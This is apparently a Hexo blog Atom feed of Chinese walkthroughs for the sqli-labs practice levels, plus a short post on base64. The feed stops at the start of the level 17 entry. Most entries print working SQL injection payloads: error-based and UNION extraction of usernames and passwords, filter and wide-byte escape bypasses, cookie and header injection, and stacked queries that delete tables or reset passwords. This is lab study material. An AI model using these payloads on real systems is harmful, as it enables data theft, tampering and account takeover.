<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Shelly、夏风</title>
  
  <subtitle>PoKeMoN</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-02-25T10:32:45.143Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>less46~49</title>
    <link href="http://example.com/2022/02/25/less46-49/"/>
    <id>http://example.com/2022/02/25/less46-49/</id>
    <published>2022-02-25T10:15:17.000Z</published>
    <updated>2022-02-25T10:32:45.143Z</updated>
    
    <content type="html"><![CDATA[<p>这几题是基于错误_GET_数字型_排序注入</p><p>在前面的关卡中我们大多是使用 id这个参数来获取到正常的页面，但在这几关中我们要使用 sort 这个参数，因为后台源代码这样设置了</p><p>我们看到了正常的页面，从中我们也发现了数字的不同，页面给我们呈现出的账号表格中的顺序是不同的，那么这就是我们这几关要说的知识点。<br>这关往后都是order by语句与limit语句的相关注入，还是很实用的，尤其是对于一些会显示表格的网站，他们的 URL 中通常都会有sort和limit两个参数。<br><img src="https://s2.loli.net/2022/02/25/IXRB6t9fkyECZnP.png" alt="1.png"><br><img src="https://s2.loli.net/2022/02/25/PLtGnbSvhUs2ixy.png" alt="2.png"></p><p>尝试sort=1 asc和sort=1 desc，分别显示升序和降序的表格，说明此处是注入点，即注入点在order by后的参数中，而order by不同于在where后的注入，不能使用union等进行注入。</p><p><img src="https://s2.loli.net/2022/02/25/2sSebnrWtjfq9F1.png" alt="3.png"></p><p><img src="https://s2.loli.net/2022/02/25/NBPvsoId4fx1juT.png" alt="4.png"><br>所以这里仍然可以尝试报错注入的方式：<br>    ?sort=UpdateXml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e),1)<br><img src="https://s2.loli.net/2022/02/25/f6pouVbvAWTBrQz.png" alt="5.png"><br>也可以使用基于报错注入：<br>    ?sort=(select 1 from (select count(*),concat_ws(‘-‘,(select database()),floor(rand()*2))as a from information_schema.tables group by a) b)</p><p><img src="https://s2.loli.net/2022/02/25/6TzvrQm3qw1uXjR.png" alt="6.png"><br>    ?sort=(select 1 from (select count(*),concat_ws(‘-‘,(select group_concat(table_name) from information_schema.tables where table_schema=’security’),floor(rand()*2))as a from information_schema.tables group by a) b)</p><p><img src="https://s2.loli.net/2022/02/25/Omt8iAwlvH9WIEs.png" alt="7.png"></p><pre><code>?sort=(select 1 from (select count(*),concat_ws(&#39;-&#39;,(select column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; limit 1,1),floor(rand(0)*2))as a from information_schema.tables group by a) b)</code></pre><p><img src="https://s2.loli.net/2022/02/25/laGfnvdsVKy8PAB.png" alt="8.png"><br>    ?sort=(select 1 from (select count(*),concat_ws(‘-‘,(select concat_ws(‘-‘,id,username,password) from users limit 0,1),floor(rand(0)*2))as a from information_schema.tables group by a) b)<br><img src="https://s2.loli.net/2022/02/25/ESr4KFVhT8oCWPY.png" alt="9.png"></p><p>其余的除了闭合方式不同其他基本相同。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这几题是基于错误_GET_数字型_排序注入&lt;/p&gt;
&lt;p&gt;在前面的关卡中我们大多是使用 id这个参数来获取到正常的页面，但在这几关中我们要使用 sort 这个参数，因为后台源代码这样设置了&lt;/p&gt;
&lt;p&gt;我们看到了正常的页面，从中我们也发现了数字的不同，页面给我们呈现出的账</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>堆叠注入（less38~45）</title>
    <link href="http://example.com/2022/02/25/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"/>
    <id>http://example.com/2022/02/25/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</id>
    <published>2022-02-25T07:30:00.000Z</published>
    <updated>2022-02-25T08:48:22.587Z</updated>
    
    <content type="html"><![CDATA[<ul><li>原理介绍<br>在 SQL 中，分号 ； 是用来表示一条 sql 语句的结束。试想一下我们在 ; 结束一个 sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而 union injection （联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于 union或者 union all 执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。<br>例如以下这个例子：</li></ul><p>用户输入：<br>1; DELETE FROM products<br>服务器端生成的 sql 语句为：（因未对输入的参数进行过滤）<br>Select * from products where productid=1;DELETE FROM products</p><p>当执行查询后，第一条显示查询信息，第二条则将整个表进行删除</p><ul><li>堆叠注入的局限性<br>堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到 API 或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。</li></ul><p>新建一个表 select * from users where id=1;create table test like users;<br>此命令就在查询id为1的数据时也建立了一个test<br><img src="https://s2.loli.net/2022/02/25/T5YWfA6sKcXqhNO.png" alt="1.png"><br>修改数据 select * from users where id=1;insert into users(id,username,password) values(‘100’,’new’,’new’);<br><img src="https://s2.loli.net/2022/02/25/dgnPwEMeZI28Nz1.png" alt="2.png"></p><p>在less38<del>41中都是使用了堆叠注入的方式<br><img src="https://s2.loli.net/2022/02/25/5omqBGJu7Zr3DhP.png" alt="3.png"><br>而less42</del>45中的格式与less24的类似但是点击新建用时无法进行</p><p><img src="https://s2.loli.net/2022/02/25/QHBThRuijYM6aUg.png" alt="4.png"></p><p>，并且观察源码后能够发现对与账户及密码都进行了过滤，不能像less24去二次注入修改密码。<br><img src="https://s2.loli.net/2022/02/25/GJeVhcp7sX3z6vZ.png" alt="6.png"><br>但less42中有错误回显，可以进行报错来爆破。当然这里使用堆叠才符合题意。<br><img src="https://s2.loli.net/2022/02/25/dSqN3uIzYc4p8E6.png" alt="5.png"><br>使用<br>    1’;update users set password=’hello’ where username=’Dumb’ #<br>来将dumb的密码修改为hello，来使我们能够登入其账号。<br><img src="https://s2.loli.net/2022/02/25/czj24HLWUd3TRBs.png" alt="7.png"></p><p><img src="https://s2.loli.net/2022/02/25/fV9jU8vLRomJ6cP.png" alt="8.png"><br>less43与less42相似</p><p>本关是基于盲注的，这里盲注主要是要没有报错信息，所以要采用盲注。这关与 42 关的区<br>别就在于没有报错信息，当 POST 没有报错回显时，判断查询语句就需要构造永真条件同化登录失败与查询出错，通过返回的图片不同来确定是否符合查询语句闭合的条件：</p><p>如果登录失败，可以看到这样的页面：<br><img src="https://s2.loli.net/2022/02/25/VToqfnzg4N5bM32.png" alt="9.png"></p><p>用万能密码：1’or1=1#登入即可登入成功然后推断出闭合条件后即可进行与上题一样的注入方式<img src="https://s2.loli.net/2022/02/25/7wk3m4PTgJvdrIi.png" alt="10.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;ul&gt;
&lt;li&gt;原理介绍&lt;br&gt;在 SQL 中，分号 ； 是用来表示一条 sql 语句的结束。试想一下我们在 ; 结束一个 sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而 union injection （联合注入）也是将两条语句合并在一起，</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>宽字节注入（less32 33 34  35 36 37的解法）</title>
    <link href="http://example.com/2022/02/25/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/"/>
    <id>http://example.com/2022/02/25/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/</id>
    <published>2022-02-25T00:57:49.000Z</published>
    <updated>2022-02-25T01:14:17.658Z</updated>
    
    <content type="html"><![CDATA[<p>mysql 在使用 GBK 编码的时候，会认为两个字符为一个汉字，例如%aa%5c 就是一个汉字（前一个 ascii 码大于 128 才能到汉字的范围）。我们在过滤 ’ 的时候，往往利用的思路是将‘转换为\’。<br>PHP 自带一些转义特殊字符的函数，如addslashes()，mysql_real_escape_string()，mysql_escape_string()等，这些函数可用来防止 SQL 注入。</p><p>  如id=1’or’1’=’1，单引号本用来闭合语句，这些函数会自动转义这些闭合的单引号，在这些单引号前面加上转义符\，变为1&#39;or&#39;1&#39;=&#39;1，如此在 SQL 查询中是一个普通的字符串，不能进行注入。<br>  而网站在过滤’的时候，通常的思路就是将’转换为&#39;,因此我们在此想办法将’前面添加的\去掉，一般有两种思路：</p><ul><li>%bb吃掉<br>如果程序的默认字符集是GBK等宽字节字符集，就有可能产生宽字节注入，绕过上述过滤。<br>若在 PHP 中使用mysql_query(“set names gbk”)将默认字符集设为GBK，而使用addslashes()转义用户输入，这时如果用户输入%bb%27，则addslashes()会在%27前面加上一个%5c字符，即转义字符\。<br>而 MySQL 在使用GBK编码时，会认为两个字符为一个汉字，%bb%5c是一个宽字符（前一个 ASCII 码大于 128 才能到汉字的范围），也就是籠，也就是说%bb%5c%27=籠’，这样单引号就未被转义能闭合语句，从而产生 SQL 注入。%bb并不是唯一一个可以产生宽字节注入的字符，理论上%81-%FE均可。</li></ul><ul><li>过滤&#39;中的<br>构造%bb%5c%5c%27，addslashes()会在两个%5c和%27前都加上\即%5c，变为%bb %5c%5c %5c%5c %5c%27，但宽字符集认为%bb%5c是一个字符即籠，则变为%bb%5c %5c%5c %5c%5c %27即籠\\‘，四个\正好转义为两个\，即’未被转义。这也是 bypass 的一种方法。</li></ul><p>之后less 32 less 33 less 34 less35 less36 less37都会使用这种方式来消除转义字符。</p><p>0x02：宽字符注入的修复<br>先调用mysql_set_charset函数设置连接所使用的字符集为gbk，再调用mysql_real_escape_string函数来过滤用户输入。</p><p>（也就是说，先不进行转义，首先以GBK编码的形式对提交上来的参数进行编码，然后再进行转义，（先编码也意味着反斜杠即5c不会出现，到下一步的转义引号才出现）这就造成了编码过后转义引号的反斜杠即字符5c不会和字符df变成一个宽字符，阻止了df 和 5c 的拼接，于是防宽字符注入成功）<br>————————————————</p><p><a href="https://blog.csdn.net/weixin_39934520/article/details/105933348"><em>原文链接</em></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;mysql 在使用 GBK 编码的时候，会认为两个字符为一个汉字，例如%aa%5c 就是一个汉字（前一个 ascii 码大于 128 才能到汉字的范围）。我们在过滤 ’ 的时候，往往利用的思路是将‘转换为\’。&lt;br&gt;PHP 自带一些转义特殊字符的函数，如addslashe</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>判断过滤</title>
    <link href="http://example.com/2022/02/25/%E5%B0%8F%E6%8F%90%E7%A4%BA/"/>
    <id>http://example.com/2022/02/25/%E5%B0%8F%E6%8F%90%E7%A4%BA/</id>
    <published>2022-02-25T00:46:25.000Z</published>
    <updated>2022-02-25T01:03:42.803Z</updated>
    
    <content type="html"><![CDATA[<p>小提示：</p><p>如何判断数字型or被过滤</p><p>而没有错误回显时，我们又应该怎么判断是数字型注入还是引号被过滤呢？</p><p>在能分辨出正确回显和错误回显（有固定字符串）时，id=1正确回显，尝试id=1’和id=1”：</p><p>若两者都正确回显：很可能是被过滤引号<br>若两者都错误回显：很可能是数字型查询<br>若一正确一错误：基本可确定是字符型查询</p><p>通过此判断less 35 的为数字型查询，因此题目过滤’我们即可忽略<br>————————————————</p><p><a href="https://blog.csdn.net/weixin_39934520/article/details/105923551"><em>原文链接</em></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;小提示：&lt;/p&gt;
&lt;p&gt;如何判断数字型or被过滤&lt;/p&gt;
&lt;p&gt;而没有错误回显时，我们又应该怎么判断是数字型注入还是引号被过滤呢？&lt;/p&gt;
&lt;p&gt;在能分辨出正确回显和错误回显（有固定字符串）时，id=1正确回显，尝试id=1’和id=1”：&lt;/p&gt;
&lt;p&gt;若两者都正确回显：</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>less29 less30  less31</title>
    <link href="http://example.com/2022/02/24/less29/"/>
    <id>http://example.com/2022/02/24/less29/</id>
    <published>2022-02-24T08:48:31.000Z</published>
    <updated>2022-02-24T09:27:32.545Z</updated>
    
    <content type="html"><![CDATA[<p>less29是基于错误_GET_双服务器_单引号_字符型注入</p><p>服务器（两层）架构：服务器端有两个部分：第一部分为 tomcat 为引擎的 jsp 型服务器，第二部分为 apache 为引擎的 php 服务器，真正提供 web 服务的是 php 服务器。<br>工作流程为：client 访问服务器，能直接访问到 tomcat 服务器，然后 tomcat 服务器再向 apache 服务器请求数据。数据返回路径则相反。<br>    ?id=1&amp;id=-1’ union select 1,database(),3–+</p><p><img src="https://s2.loli.net/2022/02/24/5zrDFRih4oZljbp.png" alt="1.png"><br>    ?id=1&amp;id=-1’ union select 1,(select group_concat(table_name)from information_schema.tables where table_schema=’security’),3–+</p><p><img src="https://s2.loli.net/2022/02/24/YcBz1Km3wf8kOUZ.png" alt="2.png"></p><pre><code>?id=1&amp;id=-1&#39; union select 1,(select group_concat(column_name)from information_schema.columns where table_name=&#39;users&#39;),3--+</code></pre><p><img src="https://s2.loli.net/2022/02/24/echTi8daCkqLsAy.png" alt="3.png"></p><pre><code>?id=1&amp;id=-1&#39; union select 1,(select group_concat(id,username,&#39;~&#39;,password)from security.users),3--+</code></pre><p><img src="https://s2.loli.net/2022/02/24/8O7QriUcdhCeklR.png" alt="4.png"></p><p>less 30基于错误_GET_双服务器_双引号_字符型_盲注<br>有正确回显但无错误回显,所以可以盲注，延时注入，联合注入</p><p>less 31基于错误_GET_双服务器_双引号_小括号_字符型注入<br>和前面的做法一样，只不过这里是小括号+双引号闭合罢了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;less29是基于错误_GET_双服务器_单引号_字符型注入&lt;/p&gt;
&lt;p&gt;服务器（两层）架构：服务器端有两个部分：第一部分为 tomcat 为引擎的 jsp 型服务器，第二部分为 apache 为引擎的 php 服务器，真正提供 web 服务的是 php 服务器。&lt;br&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>less 27 and less28</title>
    <link href="http://example.com/2022/02/24/27/"/>
    <id>http://example.com/2022/02/24/27/</id>
    <published>2022-02-24T08:13:45.000Z</published>
    <updated>2022-02-24T08:31:22.984Z</updated>
    
    <content type="html"><![CDATA[<p>在此题对于源代码进行观察发现没有过滤or与and，过滤了几个大小写的union和select但是可以用随机大小写绕过，过滤了–、#以及/<em><em>/，过滤了两次空格，过滤了/但没过滤\。<br>所以实际上只过滤了注释与空格，与 Less 26 相似。<br><img src="https://s2.loli.net/2022/02/24/xYLqMWKomksSyN7.png" alt="1.png"><br>    ?id=0’/</em>%0a*/UnIoN%0aSeLeCt/*%0a</em>/1,database(),2/<em>%0a</em>/||/<em>%0a</em>/‘1’=’1</p><p><img src="https://s2.loli.net/2022/02/24/2JMKA7pHv5SwLEf.png" alt="2.png"><br>    ?id=0’/<em>%0a</em>/UnIoN%0aSeLeCt/<em>%0a</em>/1,(SelEct(group_concat(table_name))from(information_schema.tables)where(table_schema=’security’)),2/<em>%0a</em>/||/<em>%0a</em>/‘1’=’1<br><img src="https://s2.loli.net/2022/02/24/T7Q8nOmB4gqMYW6.png" alt="3.png"><br>    ?id=0’%0buniOn%0bsElEct%0b1,(group_concat(column_name)),3%0bfrom%0binformation_schema.columns%0bwhere%0btable_schema=’security’%0bAnd%0btable_name=’users’%0b%26%26%0b’1’=’1</p><p><img src="https://s2.loli.net/2022/02/24/fkgDKAHhOmnX9jv.png" alt="4.png"></p><pre><code>?id=0&#39;/*%0a*/UnIoN/*%0a*/SeLeCt/*%0a*/1,(SeLeCt/*%0a*/group_concat(concat_ws(&#39;$&#39;,id,username,password))/*%0a*/from/*%0a*/users),3/*%0a*/||/*%0a*/&#39;1&#39;=&#39;1</code></pre><p><img src="https://s2.loli.net/2022/02/24/2BOkahRxvnePzTc.png" alt="5.png"></p><p>less 27a则为双引号注入，不能错误回显与前几关相似</p><p>less 28和28a则是发现没有过滤or与and。过滤了相连的union和select，/i同时匹配大小写，\s匹配任意空白字符如制表符、换行符、空格等，使用%a0等空格的URL编码可以绕过。过滤了–、#以及/**/。过滤了两次空格。过滤了/但没过滤\。通过相关符号绕过过滤即可。<br>例如<br>    ?id=0’)%0buniOn%0bsElEct%0b1,database(),3%0bor%0b(‘1’)=(‘1 </p><p><img src="https://s2.loli.net/2022/02/24/ZUwgYFJjmDcKsaf.png" alt="6.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在此题对于源代码进行观察发现没有过滤or与and，过滤了几个大小写的union和select但是可以用随机大小写绕过，过滤了–、#以及/&lt;em&gt;&lt;em&gt;/，过滤了两次空格，过滤了/但没过滤\。&lt;br&gt;所以实际上只过滤了注释与空格，与 Less 26 相似。&lt;br&gt;&lt;img </summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>26</title>
    <link href="http://example.com/2022/02/24/26/"/>
    <id>http://example.com/2022/02/24/26/</id>
    <published>2022-02-24T07:09:46.000Z</published>
    <updated>2022-02-24T07:47:47.418Z</updated>
    
    <content type="html"><![CDATA[<p>由题目可以知道此题除了过滤‘or’和‘and’还过滤了行注释–与#(含URL编码)以及多行注释/**/（被解释为空格，常用于过滤空格时），还过滤了(空格)，以及正反斜杠/与\。所以此处想要破解就需要尽量避免对与空格的使用，或找到可以代替空格的字符来表达，我这里使用updatexml（）来避免空格的使用。<br><img src="https://s2.loli.net/2022/02/24/olzdMjRS7VZrHtT.png" alt="1.png"></p><pre><code>&#39;%26%26updatexml(1,concat(&#39;~&#39;,database(),&#39;~&#39;),1)%26%26&#39;1&#39;=&#39;1       //这里%26%26代替&amp;&amp;</code></pre><p><img src="https://s2.loli.net/2022/02/24/dTBC4vkzOiyMsnQ.png" alt="2.png"></p><pre><code>?id=&#39;%26%26updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&#39;security)),0x7e),1)||&#39;1&#39;=&#39;1</code></pre><p><img src="https://s2.loli.net/2022/02/24/LhHK7I3kgEx6jJM.png" alt="3.png"></p><pre><code>?id=%27%26%26updatexml(1,concat(0x7e,substr((select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name=%27users%27)),33,64),0x7e),1)||%271%27=%271</code></pre><p><img src="https://s2.loli.net/2022/02/24/46ZqCua75MrRJX8.png" alt="4.png"></p><pre><code>?id=%27%26%26updatexml(1,concat(0x7e,substr((select(group_concat(id,username,&#39;~&#39;,passwoorrd))from(security.users)),1,31),0x7e),1)||%271%27=%271</code></pre><p><img src="https://s2.loli.net/2022/02/24/LCqVHPhd9cmz7vR.png" alt="5.png"></p><p>但在26a中没有错误回显只能使用普通注入<br>    ?id=’)%0bunion%0bselect%0b1,database(),3%0b||1=(‘1<br>之后和原先的一样</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;由题目可以知道此题除了过滤‘or’和‘and’还过滤了行注释–与#(含URL编码)以及多行注释/**/（被解释为空格，常用于过滤空格时），还过滤了(空格)，以及正反斜杠/与\。所以此处想要破解就需要尽量避免对与空格的使用，或找到可以代替空格的字符来表达，我这里使用updat</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>less25</title>
    <link href="http://example.com/2022/02/24/less25/"/>
    <id>http://example.com/2022/02/24/less25/</id>
    <published>2022-02-24T06:37:50.000Z</published>
    <updated>2022-02-24T06:47:30.963Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://s2.loli.net/2022/02/24/vhJeSCWwg69fcmy.png" alt="1.png"><br>由此题的体面可以推出这题含有，‘or’和‘and’的过滤，需要绕过过滤来进行破解<br>有过滤的时候首先要判断这个过滤是一次性的还是非一次性的：<br>若是一次性的，且只是将过滤字符换成了空字符：<br>可以考虑用双写绕过：or=oorr、and=anandd等等</p><p>若是非一次性的，就要考虑一些变形：<br>大小写变形绕过—— or=Or=oR=OR<br>利用运算符——   or=||、and=&amp;&amp;<br>URL编码绕过——  #=%23，Hex编码—— ~=0x7e<br>添加注释  ——  /<em>or</em>/</p><p>此题为一次性的过滤因此可以使用双写的方式来跳过过滤<br>将information改为infoorrmation<br>  password改为passwoorrd<br>其余爆破代码与less 1相同<br><img src="https://s2.loli.net/2022/02/24/cZGT1jDhObk4FHQ.png" alt="2.png"><br><img src="https://s2.loli.net/2022/02/24/8FixS3J5oWgGqRb.png" alt="3.png"><br><img src="https://s2.loli.net/2022/02/24/Ku8NyHghTzpAIUe.png" alt="4.png"></p><p>也可以使用报错破解的方式：<br>?id=-1’ || extractvalue(1,concat(0x7e,database()))– #<br>或者<br>?id=1’ || extractvalue(1,concat(0x7e,database()))– #     </p><p>less 25a：<br>本关与Less-25十分相似，既可以正常union注入也可以用脚本Bool或Time盲注。但却不能报错注入：<br>原因在于没有输出错误项，即关闭了错误报告。<br><img src="https://s2.loli.net/2022/02/24/4lpHgYwPGX6VLk7.png" alt="5.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://s2.loli.net/2022/02/24/vhJeSCWwg69fcmy.png&quot; alt=&quot;1.png&quot;&gt;&lt;br&gt;由此题的体面可以推出这题含有，‘or’和‘and’的过滤，需要绕过过滤来进行破解&lt;br&gt;有过滤的时候首先要判断这个过滤</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>less 23</title>
    <link href="http://example.com/2022/02/24/23/"/>
    <id>http://example.com/2022/02/24/23/</id>
    <published>2022-02-24T05:36:25.000Z</published>
    <updated>2022-02-24T05:47:26.986Z</updated>
    
    <content type="html"><![CDATA[<p>由题目源码中可以得出这边题目与less 1的区别是这边将#，+，–给过滤不能使用注释符来忽略最后的’。需要使用 or ‘1’=’1或去除’的方法进行破解。<br><img src="https://s2.loli.net/2022/02/24/drUpalCmLwsEDzZ.png" alt="1.png"></p><p>再从union select 1，2，3中可以看出所回显的是1，2两个数据通过这些信息就可以开始破解。<br><img src="https://s2.loli.net/2022/02/24/KugFDGSkl2rQI8e.png" alt="2.png"></p><pre><code>?id=-1&#39; union select 1,(database()),3 or &#39;1&#39;=&#39;1</code></pre><p><img src="https://s2.loli.net/2022/02/24/nLfNyk61GpjeRgS.png" alt="3.png"></p><pre><code>?id=-1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),3 or &#39;1&#39;=&#39;1</code></pre><p><img src="https://s2.loli.net/2022/02/24/5fW49S2YiI3Dsae.png" alt="4.png"></p><pre><code>?id=-1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;),3 or &#39;1&#39;=&#39;1</code></pre><p><img src="https://s2.loli.net/2022/02/24/owWSBM5uabGpIx1.png" alt="5.png"><br>    ?id=-1’ union select 1,(select group_concat(id,username,’~’,password) from security.users),3 or ‘1’=’1<br><img src="https://s2.loli.net/2022/02/24/nRfHakymSCIwdjv.png" alt="6.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;由题目源码中可以得出这边题目与less 1的区别是这边将#，+，–给过滤不能使用注释符来忽略最后的’。需要使用 or ‘1’=’1或去除’的方法进行破解。&lt;br&gt;&lt;img src=&quot;https://s2.loli.net/2022/02/24/drUpalCmLwsEDzZ</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>对于 base64 的基础理解</title>
    <link href="http://example.com/2022/02/24/base64/"/>
    <id>http://example.com/2022/02/24/base64/</id>
    <published>2022-02-24T04:22:21.000Z</published>
    <updated>2022-02-24T04:32:29.703Z</updated>
    
    <content type="html"><![CDATA[<p>Base64  是网络上最常见的用于传输8Bit字节码的编码方式之一，Base64就是一种基于64个可打印字符来表示二进制数据的方法。<br>Base64，是用64个可打印字符来表示二进制数据的方法。Base64的索引与对应字符的关系。<br><img src="https://s2.loli.net/2022/02/24/5ltD7ihAVGfILKS.png" alt="01.png"></p><p>将索引转换为对应的二进制数据的话需要至多6个Bit。然而ASCII码需要8个Bit来表示，6个Bit当然不能存储8个Bit的数据，但是4<em>6个Bit可以存储3</em>8个Bit的数据。如下表所示：<br><img src="https://s2.loli.net/2022/02/24/WqV2LYvNpmSiw6a.png" alt="02.png"><br>可以看到“Son”通过Base64编码转换成了“U29u”。这是刚刚好的情况，3个ASCII字符刚好转换成对应的4个Base64字符。当所转换字符不为三的倍数时一律采取补0变为3的倍数的方式来转换</p><p><img src="https://s2.loli.net/2022/02/24/gQMN1lacFVx3jkC.png" alt="03.png"></p><p>其解码编码可在网上进行<br><a href="https://base64.us/"><em>在线编码译码</em></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Base64  是网络上最常见的用于传输8Bit字节码的编码方式之一，Base64就是一种基于64个可打印字符来表示二进制数据的方法。&lt;br&gt;Base64，是用64个可打印字符来表示二进制数据的方法。Base64的索引与对应字符的关系。&lt;br&gt;&lt;img src=&quot;https</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>less 20 and less 21 and less22</title>
    <link href="http://example.com/2022/02/24/20/"/>
    <id>http://example.com/2022/02/24/20/</id>
    <published>2022-02-24T03:55:52.000Z</published>
    <updated>2022-02-24T04:38:03.525Z</updated>
    
    <content type="html"><![CDATA[<p>从源代码中我们可以看到COOKIE从username中获得值后，当再次刷新时，会从COOKIE中读取username，然后进行查询。<br>登陆后将uname写入Cookie。<br>在每次Request (GET / POST)页面时后台判断Cookie是否存在，若不存在则为登录界面；若存在则读取Cookie中字段uname。在数据库中按username查询，若用户存在则将查询到用户id、username、password回显；<br>可以判断出注入点就在Cookie处.<br>登录成功之后，我们可以修改cookie,当再次刷新的时候，这时候sql语句就会被修改，我们使用updatexml进行破解。<br><img src="https://s2.loli.net/2022/02/24/PQgf5lWRc74j2m3.png" alt="1.png"></p><pre><code>dhakkan’ and updatexml(1,concat(&#39;~&#39;,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31),&#39;~&#39;),1)#</code></pre><p><img src="https://s2.loli.net/2022/02/24/CPjQtOaqcyz56EN.png" alt="2.png"></p><pre><code>dhakkan&#39; and updatexml(1,concat(&#39;~&#39;,substr((select group_concat(column_name) from information_schema.columns  where table_name=&#39;users&#39;),1,31),&#39;~&#39;),1)#</code></pre><p><img src="https://s2.loli.net/2022/02/24/yiBdurDIwLm8kAg.png" alt="3.png"></p><pre><code>dhakkan &#39;and updatexml(1,concat(0x7e,substr((select group_concat(username,&#39;~&#39;,password)from security.users),1,64),0x7e),1)#</code></pre><p><img src="https://s2.loli.net/2022/02/24/Cr9PHNa326Osvyx.png" alt="4.png"></p><p>less 21这里的界面和上一关的内容差不多，唯一的区别就是cookie使用了base64进行了加密<br>我们这里与上一关一样，修改cookie即可，唯一的附加内容就是将cookie进行base64加密：<br>cookie值为：<br>    YWRtaW4xJylhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBAQGJhc2VkaXIpLDB4N2UpKSM=</p><p>less 22与less 21不同为此题为”而上一题为’)，其余爆破的方式相同。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;从源代码中我们可以看到COOKIE从username中获得值后，当再次刷新时，会从COOKIE中读取username，然后进行查询。&lt;br&gt;登陆后将uname写入Cookie。&lt;br&gt;在每次Request (GET / POST)页面时后台判断Cookie是否存在，若不存在</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>less18 and less19</title>
    <link href="http://example.com/2022/02/23/18/"/>
    <id>http://example.com/2022/02/23/18/</id>
    <published>2022-02-23T12:09:45.000Z</published>
    <updated>2022-02-23T12:28:20.561Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://s2.loli.net/2022/02/23/dfUAW1hJIDjqCaS.png" alt="1"><br>通过此题题目可知在正确登入账户后回回显ip地址及User Agent ，<br>并且通过源码可知在登入后将useragent和IP的数据插入的数据库中，但其账号密码都经过过滤，所以联系到通过利用user agent爆破。使用burp suip进行抓包来改变user agent内容来进行爆破<br><img src="https://s2.loli.net/2022/02/23/2a7IXPErgB83AlY.png" alt="2"><br><img src="https://s2.loli.net/2022/02/23/y6IsJKSBbV3nkNQ.png" alt="3"></p><pre><code>&#39; or updatexml(1,concat(&#39;~&#39;,(database()),&#39;~&#39;),1) and &#39;1&#39;=&#39;1</code></pre><p><img src="https://s2.loli.net/2022/02/23/G7O3pqFtfnHLS2r.png" alt="4"></p><pre><code>&#39;or updatexml(1,concat(&#39;~&#39;,substr((select group_concat(table_name) from information_schema.tables where table_scheam=&#39;security&#39;),1,31),&#39;~&#39;),1) and &#39;1&#39;=&#39;1</code></pre><p><img src="https://s2.loli.net/2022/02/23/ik7n9OwENRbAFo8.png" alt="5"></p><pre><code>&#39; or updatexml(1,concat(&#39;~&#39;,substr((select group_concat(column_name)from information_schema.columns where table_name=&#39;security&#39;),1,31),&#39;~&#39;),1) and &#39;1&#39;=&#39;1</code></pre><p><img src="https://s2.loli.net/2022/02/23/ad2v1iy5ZhsEfqx.png" alt="6"></p><pre><code>&#39; or updatexml(1,concat(0x7e,substr((select*from(select group_concat(id,&#39;~&#39;,username,&#39;~&#39;,password)from security.users)a),1,31),0x7e),1) and &#39;1&#39;=&#39;1</code></pre><p><img src="https://s2.loli.net/2022/02/23/eAy4gL73qTzIonf.png" alt="7"></p><p>less 19的话进去发现登入回显的为refer,所以与less18的做法相同，更改refer即可<br><img src="https://s2.loli.net/2022/02/23/cmld2pajVHZorUh.png" alt="8"><br><img src="https://s2.loli.net/2022/02/23/9THDpnPqL2Cwt5d.png" alt="9"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://s2.loli.net/2022/02/23/dfUAW1hJIDjqCaS.png&quot; alt=&quot;1&quot;&gt;&lt;br&gt;通过此题题目可知在正确登入账户后回回显ip地址及User Agent ，&lt;br&gt;并且通过源码可知在登入后将useragent和</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>less 17</title>
    <link href="http://example.com/2022/02/23/17/"/>
